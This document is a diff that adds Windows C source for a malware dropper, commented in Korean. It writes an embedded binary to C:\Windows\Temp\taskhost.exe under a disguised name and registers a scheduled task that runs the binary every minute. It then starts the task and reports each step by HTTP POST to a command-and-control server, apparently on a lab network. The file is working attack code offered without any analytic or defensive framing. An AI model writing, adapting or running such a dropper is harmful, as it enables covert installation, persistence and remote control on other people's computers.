@@ -1,0 +1,148 @@
+#include <winsock2.h> // Winsock API for HTTP
+#include <winhttp.h> // WinHttp API for C2/Logging
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdarg.h>
+
+// --- 라이브러리 링크 지시자 (MinGW-w64에서 필요) ---
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "winhttp.lib")
+
+// --- C2 및 로깅 서버 정보 설정 ---
+#define C2_SERVER_IP L"192.168.56.1" // Host Linux IP
+#define C2_PORT 80
+#define C2_LOG_PATH L"/log" // 로그 데이터 전송 경로 (POST)
+#define USER_AGENT L"info.exe Dropper"
+
+#define COMMAND_BUFFER_SIZE 4096
+#define LOG_BUFFER_SIZE 1024
+
+// --- Log/Drop/Schtasks 정의 ---
+#define PAYLOAD_PATH "C:\\Windows\\Temp\\taskhost.exe" 
+#define TASK_NAME "Al3" 
+
+// --- 함수 선언 ---
+BOOL DropFile(const char* path, const unsigned char* data, unsigned int size);
+void Post_Log_to_C2(const char* format, ...);
+
+// --- taskhost.exe의 바이너리 배열과 크기를 taskhost_exe_data.h에서 가져옵니다 ---
+// 이 파일은 taskhost_exe[]와 taskhost_exe_len을 정의합니다.
+#include "taskhost_exe_data.h" 
+
+// xxd 출력에 따라 배열명과 크기를 extern 선언 (taskhost_exe_data.h 파일에 정의되어 있음)
+extern unsigned char taskhost_exe[]; 
+extern unsigned int taskhost_exe_len;
+
+
+// --- 1. HTTP POST 로깅 함수 (Port 80 /log 경로 사용) ---
+void Post_Log_to_C2(const char* format, ...) {
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    char buffer[LOG_BUFFER_SIZE];
+    char final_log[LOG_BUFFER_SIZE + 50];
+    va_list args;
+    WSADATA wsaData; // Winsock 초기화를 위해 필요
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return; // Winsock 초기화
+
+    // 로그 메시지 포맷 (가변 인자 처리)
+    va_start(args, format);
+    vsnprintf(buffer, LOG_BUFFER_SIZE - 20, format, args);
+    va_end(args);
+    
+    // 로그 메시지에 시간 및 파일 정보 추가
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    snprintf(final_log, sizeof(final_log), "[%02d:%02d:%02d/INFO.JPG] %s", 
+             st.wHour, st.wMinute, st.wSecond, buffer);
+
+    // WinHttp 초기화 및 요청
+    hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) goto cleanup;
+
+    hConnect = WinHttpConnect(hSession, C2_SERVER_IP, C2_PORT, 0);
+    if (!hConnect) goto cleanup;
+
+    hRequest = WinHttpOpenRequest(hConnect, L"POST", C2_LOG_PATH, NULL,
+                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) goto cleanup;
+
+    // Content-Type 설정 및 데이터 준비
+    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", (ULONG)-1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
+    char post_data[LOG_BUFFER_SIZE + 20];
+    snprintf(post_data, sizeof(post_data), "log_data=%s", final_log);
+    DWORD data_len = strlen(post_data);
+
+    // 요청 전송
+    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                       (LPVOID)post_data, data_len, data_len, 0);
+    
+cleanup: // 리소스 정리
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+    WSACleanup(); // Winsock 정리
+}
+
+
+// --- 2. main 함수 (printf 대신 Post_Log_to_C2 사용) ---
+int main() {
+    // taskhost.exe의 바이너리 및 크기 매핑
+    unsigned char* payload = taskhost_exe;
+    unsigned int payload_size = taskhost_exe_len;
+    char create_cmd[512];
+    char run_cmd[256];
+    int result;
+
+    Post_Log_to_C2("Starting Final Dropper Execution...");
+
+    // 1. taskhost.exe를 C:\Windows\Temp\taskhost.exe 경로에 드롭 (파일 생성)
+    if (DropFile(PAYLOAD_PATH, payload, payload_size)) {
+        Post_Log_to_C2("SUCCESS: taskhost.exe successfully dropped to %s", PAYLOAD_PATH);
+    } else {
+        Post_Log_to_C2("ERROR: Failed to drop taskhost.exe. Aborting.");
+        return 1;
+    }
+
+
+    // 2. schtasks 명령어를 사용하여 작업 스케줄러 등록 (Persistence)
+    sprintf(create_cmd, "schtasks /create /tn \"%s\" /tr \"%s\" /sc MINUTE /mo 1 /f", TASK_NAME, PAYLOAD_PATH);
+    Post_Log_to_C2("SCHTASKS: Creating Scheduled Task: %s", create_cmd);
+    
+    result = system(create_cmd); // CMD를 호출하여 작업 생성 명령 실행
+    
+    if (result == 0) {
+        Post_Log_to_C2("SUCCESS: Scheduled Task '%s' created.", TASK_NAME);
+        
+        // 3. 작업 스케줄러 즉시 실행 (Execution)
+        sprintf(run_cmd, "schtasks /run /tn \"%s\"", TASK_NAME);
+        Post_Log_to_C2("SCHTASKS: Running Scheduled Task: %s", run_cmd);
+        
+        result = system(run_cmd); // CMD를 호출하여 작업 즉시 실행
+        
+        if (result == 0) {
+            Post_Log_to_C2("SUCCESS: Execution of taskhost.exe triggered successfully.");
+        } else {
+            Post_Log_to_C2("WARNING: Task execution trigger failed (Code: %d).", result);
+        }
+    } else {
+        Post_Log_to_C2("ERROR: Failed to create Scheduled Task (Code: %d).", result);
+    }
+
+    return 0;
+}
+
+
+// --- 3. 파일 드롭 함수 (이전과 동일) ---
+BOOL DropFile(const char* path, const unsigned char* data, unsigned int size) {
+    FILE *fp = fopen(path, "wb");
+    if (fp == NULL) return FALSE;
+    
+    if (fwrite(data, 1, size, fp) != size) {
+        fclose(fp);
+        return FALSE;
+    }
+    fclose(fp);
+    return TRUE;
+}
